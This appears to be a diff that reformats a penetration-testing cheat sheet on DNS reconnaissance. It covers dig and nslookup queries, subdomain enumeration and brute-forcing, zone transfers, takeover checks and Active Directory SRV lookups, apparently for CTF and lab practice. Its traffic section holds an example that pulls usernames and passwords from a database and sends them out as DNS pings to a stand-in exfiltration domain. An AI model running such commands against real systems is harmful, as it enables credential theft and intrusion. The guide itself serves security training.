@@ -1,163 +1,339 @@
-### **DNS Reconnaissance**
+## DNS Reconnaissance
 
-**Concept/Goal:** Querying Domain Name System (DNS) servers to resolve names to IPs, discover associated services (mail, specific protocols via SRV), identify authoritative servers, enumerate subdomains, check for misconfigurations (like zone transfers), and map the target's DNS infrastructure. This is fundamental for expanding the attack surface and understanding the target environment.
+> **Concept/Goal:**  
+> Querying DNS servers to resolve names to IPs, discover services (MX, SRV), identify authoritative servers, enumerate subdomains, check for misconfigs (zone transfers), and map DNS infrastructure. Fundamental for expanding attack surface and understanding target environment.
 
-**Key Tools:**
+---
 
-  * **CLI Query Tools:** `dig`, `host`, `nslookup`
-  * **Enumeration Frameworks:** `dnsrecon`, `fierce`, `dnsenum`
-  * **Passive Enumerators:** `amass`, `subfinder`, `assetfinder`, `sublist3r`, `theHarvester` 🔗 [See Section X.Y: Subdomain Enumeration (Passive)]
-  * **Bruteforce Tools:** `gobuster` (dns mode), `ffuf` (for vhost fuzzing finding subdomains), `nmap` (dns-brute script)
-  * **Permutation Generators:** `dnsgen`, `gotator`
-  * **Mass Resolvers:** `massdns`
-  * **Takeover Checkers:** `subjack`, `tko-subs`, `dnsReaper`
-  * **Network Scanners:** `nmap`
-  * **Packet Analyzers:** `tcpdump`
-  * **AD Specific:** `adidnsdump`
+### 1. Key Tools
 
-**Core Techniques / Workflow:**
+- **CLI Query Tools:** `dig`, `host`, `nslookup`
+- **General Recon:** `whois`
+- **Enumeration Frameworks:** `dnsrecon`, `fierce`, `dnsenum`, Metasploit (`auxiliary/gather/enum_dns`)
+- **Passive Enumerators:** `amass`, `subfinder`, `assetfinder`, `sublist3r`, `theHarvester`  
+  🔗 [See Section X.Y: Subdomain Enumeration (Passive)]
+- **Bruteforce Tools:** `gobuster` (dns mode), `ffuf` (vhost fuzzing), Nmap (`dns-brute` script)
+- **Permutation Generators:** `dnsgen`, `gotator`
+- **Mass Resolvers:** `massdns`
+- **Takeover Checkers:** `subjack`, `tko-subs`, `dnsReaper`
+- **Network Scanners:** `nmap`
+- **Packet Analyzers:** `tcpdump`
+- **AD-Specific:** `adidnsdump`
 
-#### Basic DNS Queries (dig, host)
+---
 
-  * **Default Query (A Record):**
-    💻 `dig $DOMAIN`
-    💻 `host $DOMAIN`
-  * **Specific Record Types (IPv4, IPv6, Mail, Nameserver, Text, Alias, Authority):**
-    💻 `dig $DOMAIN A` 💡 Check primary IPv4 address.
-    💻 `dig $DOMAIN AAAA` 💡 Check for IPv6 presence.
-    💻 `dig $DOMAIN MX` 💡 Identify mail servers; useful for phishing/spoofing context.
-    💻 `dig $DOMAIN NS` 💡 Identify authoritative nameservers; targets for AXFR.
-    💻 `dig $DOMAIN TXT` 💡 Look for SPF, DKIM, DMARC, verification codes, potential info leaks.
-    💻 `dig $DOMAIN CNAME` 💡 Identify aliases; useful for tracking services or takeover checks.
-    💻 `dig $DOMAIN SOA` 💡 Get zone admin info (often obfuscated email), serial number (infrequent changes?), primary NS.
-    💻 `dig $DOMAIN ANY` ⚠️ Often blocked/incomplete; prefer specific type queries.
-  * **Concise Output:**
-    💻 `dig $DOMAIN +short` (A record)
-    💻 `dig $DOMAIN MX +short`
-    💻 `dig $DOMAIN NS +short`
-  * **Reverse DNS Lookup (PTR - IP to Hostname):**
-    💻 `dig -x $TARGET_IP +short`
-    💻 `host $TARGET_IP`
-  * **Targeting Specific DNS Server:** 💡 Essential for querying internal resolvers or authoritative servers directly.
-    💻 `dig @$DNS_SERVER $DOMAIN MX`
-    💻 `dig -x $TARGET_IP @$TARGET_NS`
-    💻 `host $DOMAIN $TARGET_NS`
-  * **Tracing Resolution Path:**
-    💻 `dig +trace $DOMAIN` 💡 Debug DNS issues or understand delegation.
-  * **Filtering Output:**
-    💻 `dig +noall +answer $DOMAIN` 💡 Show only the answer section.
-    💻 `dig mx $DOMAIN | grep "MX" | grep -v ";"` 💡 Clean MX record output via shell.
-  * **Host Tool Variations:**
-    💻 `host -t a $DOMAIN`
-    💻 `host -t ns $DOMAIN`
-    💻 `host -t mx $DOMAIN`
-    💻 `host -t aaaa $DOMAIN`
-  * **Compare Public Resolvers:**
-    💻 `for r in 1.1.1.1 8.8.8.8 9.9.9.9; do echo "== $r =="; dig @$r $TARGET A +short; done | tee dns_diff.txt` 💡 Check for DNS inconsistencies or split-horizon DNS.
+### 2. Initial Domain Information
 
-#### Passive Subdomain Enumeration
+- **Whois Lookup:**  
+  ```bash
+  whois <target>
+  ```
+  > Registration details, contact info, nameserver names.
 
-  * **Leverage Certificate Transparency (crt.sh):**
-    💻 `curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u` 💡 Excellent source for subdomains with TLS certs, including potentially non-public ones.
-  * **Use Aggregator Tools:** (Requires API keys for best results) 🔗 [See Section X.Y: Subdomain Enumeration (Passive)]
-    💻 `amass enum -d $DOMAIN -passive`
-    💻 `subfinder -d $DOMAIN` (-all flag requires API keys)
-    💻 `assetfinder --subs-only $DOMAIN` (Fewer sources, no keys needed by default)
-    💻 `sublist3r -d $DOMAIN`
-  * **Query Specific APIs:**
-    💻 `curl -s "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" | cut -d',' -f1`
-    💻 `curl -s "https://rapiddns.io/subdomain/$DOMAIN?full=1" | grep -oP '<td>\K[^<]*' | grep -v "=\|www" | sort -u`
+---
 
-#### Active Subdomain Enumeration (Bruteforce)
+### 3. Basic DNS Queries (dig & host)
 
-  * 💡 Use quality wordlists (e.g., SecLists `Discovery/DNS`). 🎯 A primary method in HTB/THM for finding hidden dev/staging/admin subdomains.
-  * **Gobuster DNS Mode:**
-    💻 `gobuster dns -d $DOMAIN -w /path/to/subdomains.txt -t 50 -o gobuster_subs.txt`
-  * **dnsrecon Bruteforce:**
-    💻 `dnsrecon -d $DOMAIN -t brt -D /path/to/subdomains.txt`
-  * **fierce (Includes bruteforce):**
-    💻 `fierce -dns $DOMAIN --wordlist /path/to/subdomains.txt`
-  * **ffuf (HTTP-based VHost Fuzzing):** 💡 Finds subdomains by checking if web servers respond differently. Requires a known webserver IP.
-    💻 `ffuf -w /path/to/subdomains.txt -u http://$WEBSERVER_IP -H "Host: FUZZ.$DOMAIN" -fs <size_to_filter>`
-  * **Nmap Script:**
-    💻 `nmap --script dns-brute --script-args dns-brute.domain=$DOMAIN,dns-brute.hostlist=/path/to/subdomains.txt $TARGET_NS`
+- **Default A Record:**  
+  ```bash
+  dig $DOMAIN
+  host $DOMAIN
+  ```
+- **Specific Record Types:**  
+  ```bash
+  dig $DOMAIN A       # IPv4
+  dig $DOMAIN AAAA    # IPv6
+  dig $DOMAIN MX      # Mail servers
+  dig $DOMAIN NS      # Authoritative NS
+  dig $DOMAIN TXT     # SPF, DKIM, DMARC
+  dig $DOMAIN CNAME   # Aliases
+  dig $DOMAIN SOA     # Zone admin & serial
+  dig $DOMAIN ANY     # Often incomplete
+  host -a $DOMAIN     # Similar to ANY
+  ```
+- **Short Output:**  
+  ```bash
+  dig $DOMAIN +short
+  dig MX $DOMAIN +short
+  dig NS $DOMAIN +short
+  ```
+- **Reverse Lookup (PTR):**  
+  ```bash
+  dig -x $TARGET_IP +short
+  host $TARGET_IP
+  ```
+- **Query Specific Server:**  
+  ```bash
+  dig @$DNS_SERVER $DOMAIN MX
+  dig -x $TARGET_IP @$TARGET_NS
+  host $DOMAIN $TARGET_NS
+  ```
+- **Trace Delegation:**  
+  ```bash
+  dig +trace $DOMAIN
+  ```
+- **Filtered Answer Only:**  
+  ```bash
+  dig +noall +answer $DOMAIN
+  ```
+- **Bulk from File:**  
+  ```bash
+  dig -f domains.txt
+  ```
+- **Compare Resolvers:**  
+  ```bash
+  for r in 1.1.1.1 8.8.8.8 9.9.9.9; do
+    echo "== $r ==";
+    dig @$r $DOMAIN A +short;
+  done | tee dns_diff.txt
+  ```
 
-#### Subdomain Validation & Filtering
+---
 
-  * **Basic Host Check:**
-    💻 `host $subdomain.$DOMAIN | grep "has address"`
-  * **Filter List for Resolving Subdomains:**
-    💻 `for i in $(cat subdomainlist.txt); do host $i.$DOMAIN | grep "has address" | grep "$DOMAIN" | cut -d" " -f1,4; done`
+### 4. Basic DNS Queries (nslookup)
 
-#### Subdomain Permutation & Resolution
+- **Default A Record:**  
+  ```bash
+  nslookup <target>
+  ```
+- **Specific Types:**  
+  ```bash
+  nslookup -query=A <target>
+  nslookup -query=AAAA <target>
+  nslookup -query=MX <target>
+  nslookup -query=NS <target>
+  nslookup -query=TXT <target>
+  nslookup -query=SOA <target>
+  nslookup -query=CNAME <target>
+  nslookup -query=ANY <target>   # Often incomplete
+  ```
+- **Reverse PTR:**  
+  ```bash
+  nslookup -query=PTR <target_ip>
+  ```
+- **Interactive with Server:**  
+  ```bash
+  printf "server $DNS_SERVER\nset type=ANY\n$REVERSE_IP\nexit\n" | nslookup
+  ```
 
-  * 💡 Generate variations of known subdomains (e.g., dev.target.com -\> https://www.google.com/search?q=dev-uat.target.com, https://www.google.com/search?q=dev01.target.com). Useful for finding predictable naming schemes.
-  * **dnsgen + massdns:**
-    💻 `dnsgen known_subdomains.txt | massdns -r resolvers.txt -t A -o S -w permuted_resolved.txt` (Requires `resolvers.txt` with valid DNS resolver IPs)
-  * **Gotator:**
-    💻 `gotator -sub known_subdomains.txt -perm permutations.txt -depth 1 -numbers 10 -mindup -adv -md > potential_subdomains.txt` (Requires `permutations.txt` with patterns like `dev-`, `test-`, etc.)
+---
 
-#### DNS Zone Transfer (AXFR)
+### 5. General Enumeration Tools
 
-  * 💡 Attempts to get a full copy of the zone file from an authoritative nameserver. ⚠️ **Rarely successful** against properly configured external servers but *highly valuable* if it works (reveals all records). Always try against identified NS servers. 🎯 Common misconfiguration check in CTFs.
-  * **Using dig:**
-    💻 `dig axfr @$TARGET_NS $DOMAIN`
-  * **Using host:**
-    💻 `host -l $DOMAIN $TARGET_NS`
-  * **Using dnsrecon:**
-    💻 `dnsrecon -d $DOMAIN -t axfr`
-  * **Using Nmap:**
-    💻 `nmap -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=$DOMAIN $TARGET_NS`
+- **dnsenum:**  
+  ```bash
+  dnsenum <target>
+  ```
+- **Metasploit (enum_dns):**  
+  ```bash
+  msfconsole -q -x 'use auxiliary/gather/enum_dns;
+    set DOMAIN <domain>;
+    set WORDLIST <wordlist>;
+    run; exit'
+  ```
 
-#### DNS Service Scanning (Nmap)
+---
 
-  * **Port Scan (UDP/TCP):**
-    💻 `nmap -p 53 -sU -sT $TARGET_NS`
-  * **Version Scan (UDP):**
-    💻 `nmap -p 53 -sU -sV $TARGET_NS`
-  * **NSID Query (Identify Server Software/Version - UDP):**
-    💻 `nmap -p 53 -sU --script dns-nsid $TARGET_NS` 💡 Can help find vulnerable DNS server versions.
+### 6. Passive Subdomain Enumeration
 
-#### Subdomain Takeover Detection
+- **Certificate Transparency (crt.sh):**  
+  ```bash
+  curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" \
+    | jq -r '.[].name_value' \
+    | sed 's/\*\.//g' \
+    | sort -u
+  ```
+- **Aggregator Tools:**  
+  ```bash
+  amass enum -d $DOMAIN -passive
+  subfinder -d $DOMAIN -all
+  assetfinder --subs-only $DOMAIN
+  sublist3r -d $DOMAIN
+  ```
+- **API Queries:**  
+  ```bash
+  curl -s "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" | cut -d',' -f1
+  curl -s "https://rapiddns.io/subdomain/$DOMAIN?full=1" \
+    | grep -oP '<td>\K[^<]*' \
+    | sort -u
+  ```
 
-  * 💡 Checks if subdomains point (via CNAME) to external services (S3, Heroku, GitHub Pages, etc.) but the corresponding resource on the external service doesn't exist or isn't claimed. An attacker can then claim it to host malicious content under the target's domain. 🎯 Frequent vulnerability in HTB/THM web challenges.
-  * **Manual CNAME Check (Example for S3):**
-    💻 `host -t CNAME $subdomain.$DOMAIN` (Check if it points to an external service)
-    💻 `if host $subdomain.$DOMAIN | grep -q "alias for" && host $subdomain.$DOMAIN | grep -q "s3.amazonaws.com"; then echo "Potential S3 Takeover on $subdomain.$DOMAIN"; fi`
-  * **Automated Tools:**
-    💻 `subjack -w potential_subdomains.txt -t 100 -timeout 30 -o takeover_results.txt -ssl`
-    💻 `tko-subs -domains domains_to_check.txt`
-    💻 `dnsReaper scan -d $DOMAIN --check-takeover`
+---
 
-#### Active Directory Specific DNS
+### 7. Active Subdomain Enumeration (Bruteforce)
 
-  * 💡 AD heavily relies on SRV records to locate services. Querying these is crucial during internal AD enumeration. Target the Domain Controller (DC) as the DNS server.
-  * **Find LDAP Servers:**
-    💻 `dig @$DC_IP SRV _ldap._tcp.dc._msdcs.$DOMAIN`
-  * **Find Kerberos Servers (TCP/UDP):**
-    💻 `dig @$DC_IP SRV _kerberos._tcp.dc._msdcs.$DOMAIN`
-    💻 `dig @$DC_IP SRV _kerberos._udp.$DOMAIN`
-  * **Find Global Catalog Servers:**
-    💻 `dig @$DC_IP SRV _gc._tcp.dc._msdcs.$DOMAIN`
-  * **Find Kerberos Password Change Servers:**
-    💻 `dig @$DC_IP SRV _kpasswd._tcp.$DOMAIN`
-    💻 `dig @$DC_IP SRV _kpasswd._udp.$DOMAIN`
-  * **Dump AD Integrated DNS Zone:** (Requires domain credentials)
-    💻 `adidnsdump -u '$DOMAIN\$USER' -p '$PASSWORD' $DC_IP` 💡 Provides a comprehensive list of internal hosts known to AD DNS.
+- **Gobuster DNS Mode:**  
+  ```bash
+  gobuster dns -d $DOMAIN -w subs.txt -t 50 -o gobuster.txt
+  gobuster dns -d $DOMAIN -w subs.txt --resolver 1.1.1.1 --show-ips -t 15 -o gobuster_res.txt
+  ```
+- **dnsrecon Bruteforce:**  
+  ```bash
+  dnsrecon -d $DOMAIN -t brt -D subs.txt
+  dnsrecon -d $DOMAIN -t axfr -n $DNS_SERVER
+  ```
+- **fierce:**  
+  ```bash
+  fierce -dns $DOMAIN --wordlist subs.txt
+  ```
+- **ffuf VHost Fuzzing:**  
+  ```bash
+  ffuf -w subs.txt \
+    -u http://$WEBSERVER_IP \
+    -H "Host: FUZZ.$DOMAIN" \
+    -fs <size>
+  ```
+- **Nmap dns-brute Script:**  
+  ```bash
+  nmap --script dns-brute \
+    --script-args dns-brute.domain=$DOMAIN,\
+dns-brute.hostlist=subs.txt \
+    $TARGET_NS
+  ```
 
-#### DNS Traffic Monitoring & Exfiltration
+---
 
-  * **Capture DNS Traffic:**
-    💻 `tcpdump -i any port 53 -l -A` 💡 Monitor local DNS queries or sniff traffic on a compromised host. Add `-n` to disable name resolution.
-    💻 `tcpdump -ln -i tun0 port 53 -A 2>/dev/null | grep -E -o "([0-9A-Za-z][0-9A-Za-z\-]*\.)+[0-9A-Za-z][0-9A-Za-z\-]*"` (Capture on tun0, extract domains)
-  * **DNS Exfiltration Example (⚠️ Use Ethically & Legally\!):** 💡 Technique to leak data via crafted DNS queries to an attacker-controlled server. Very noisy if not careful.
-    💻 `mysql -h $TARGET_DB -u root -p'$PASSWORD' -e "SELECT CONCAT(username, '.', password, '.your.exfil.domain.com') FROM users;" | grep -v username | xargs -I{} ping -c 1 {}` (⚠️ Simplified example; real exfil often encodes data and uses tools like `dnscat2`).
+### 8. Subdomain Validation & Permutation
 
-#### Combined Workflows
+- **Validate with host:**  
+  ```bash
+  host $sub.$DOMAIN | grep "has address"
+  ```
+- **Resolve & Filter:**  
+  ```bash
+  for s in $(cat subs.txt); do
+    host $s.$DOMAIN \
+      | grep "has address" \
+      | grep "$DOMAIN";
+  done
+  ```
+- **Generate Permutations (dnsgen + massdns):**  
+  ```bash
+  dnsgen known.txt | massdns -r resolvers.txt -t A -o S -w permuted.txt
+  ```
+- **Gotator:**  
+  ```bash
+  gotator -sub known.txt -perm perms.txt -depth 1 \
+    -numbers 10 -mindup -adv -md > potential.txt
+  ```
 
-  * **Subfinder -\> Nuclei Exposure Scan:**
-    💻 `subfinder -d $DOMAIN -all -silent | httpx -silent | nuclei -t exposures/ -o nuclei_exposures.txt` 💡 Passively find subdomains, check if they host web servers, then scan for known exposures/misconfigurations with Nuclei templates.
-  * **Multi-Record Enum:**
-    💻 `for domain in $(cat domains.txt); do (dig +short A $domain @$NS; dig +short AAAA $domain @$NS; ...) | sort -u > $domain-records.txt; done` 💡 Script querying multiple record types for a list of domains against a specific nameserver.
+---
 
------
+### 9. DNS Zone Transfer (AXFR)
+
+- **dig AXFR:**  
+  ```bash
+  dig axfr @$TARGET_NS $DOMAIN
+  ```
+- **host AXFR:**  
+  ```bash
+  host -l $DOMAIN $TARGET_NS
+  ```
+- **dnsrecon AXFR:**  
+  ```bash
+  dnsrecon -d $DOMAIN -t axfr
+  dnsrecon -d $DOMAIN -t axfr -n $DNS_SERVER
+  ```
+- **Nmap AXFR Script:**  
+  ```bash
+  nmap -p 53 --script dns-zone-transfer \
+    --script-args dns-zone-transfer.domain=$DOMAIN \
+    $TARGET_NS
+  ```
+
+---
+
+### 10. DNS Service Scanning (Nmap)
+
+- **Port Scan:**  
+  ```bash
+  nmap -p 53 -sU -sT $TARGET_NS
+  ```
+- **Version Scan (UDP):**  
+  ```bash
+  nmap -p 53 -sU -sV $TARGET_NS
+  ```
+- **NSID Query:**  
+  ```bash
+  nmap -p 53 -sU --script dns-nsid $TARGET_NS
+  ```
+
+---
+
+### 11. Subdomain Takeover Detection
+
+- **Manual CNAME Check:**  
+  ```bash
+  host -t CNAME $sub.$DOMAIN
+  if host $sub.$DOMAIN | grep -q "s3.amazonaws.com"; then
+    echo "Potential S3 takeover on $sub.$DOMAIN";
+  fi
+  ```
+- **Automated Tools:**  
+  ```bash
+  subjack -w potential.txt -t 100 -timeout 30 -o takeover.txt -ssl
+  tko-subs -domains domains.txt
+  dnsReaper scan -d $DOMAIN --check-takeover
+  ```
+
+---
+
+### 12. Active Directory-Specific DNS
+
+- **LDAP Servers:**  
+  ```bash
+  dig @$DC_IP SRV _ldap._tcp.dc._msdcs.$DOMAIN
+  ```
+- **Kerberos Servers:**  
+  ```bash
+  dig @$DC_IP SRV _kerberos._tcp.dc._msdcs.$DOMAIN
+  dig @$DC_IP SRV _kerberos._udp.$DOMAIN
+  ```
+- **Global Catalog:**  
+  ```bash
+  dig @$DC_IP SRV _gc._tcp.dc._msdcs.$DOMAIN
+  ```
+- **Password Change:**  
+  ```bash
+  dig @$DC_IP SRV _kpasswd._tcp.$DOMAIN
+  dig @$DC_IP SRV _kpasswd._udp.$DOMAIN
+  ```
+- **Dump AD-Integrated Zone:**  
+  ```bash
+  adidnsdump -u '$DOMAIN\$USER' -p '$PASSWORD' $DC_IP
+  ```
+
+---
+
+### 13. DNS Traffic Monitoring & Exfiltration
+
+- **Capture Queries:**  
+  ```bash
+  tcpdump -i any port 53 -l -A
+  tcpdump -ln -i tun0 port 53 -A 2>/dev/null \
+    | grep -E -o "([0-9A-Za-z][0-9A-Za-z\-]*\.)+[0-9A-Za-z][0-9A-Za-z\-]*"
+  ```
+- **DNS Exfil Example:**  
+  ```bash
+  mysql -h $TARGET_DB -u root -p'$PASSWORD' \
+    -e "SELECT CONCAT(username, '.', password, '.exfil.domain.com') FROM users;" \
+    | grep -v username | xargs -I{} ping -c 1 {}
+  ```
+
+---
+
+### 14. Combined Workflows
+
+- **Subfinder → Nuclei:**  
+  ```bash
+  subfinder -d $DOMAIN -all -silent \
+    | httpx -silent \
+    | nuclei -t exposures/ -o nuclei_exposures.txt
+  ```
+- **Multi-Record Enum:**  
+  ```bash
+  for d in $(cat domains.txt); do
+    (dig +short A $d @$NS; dig +short AAAA $d @$NS) \
+    | sort -u > $d-records.txt;
+  done
+  ```
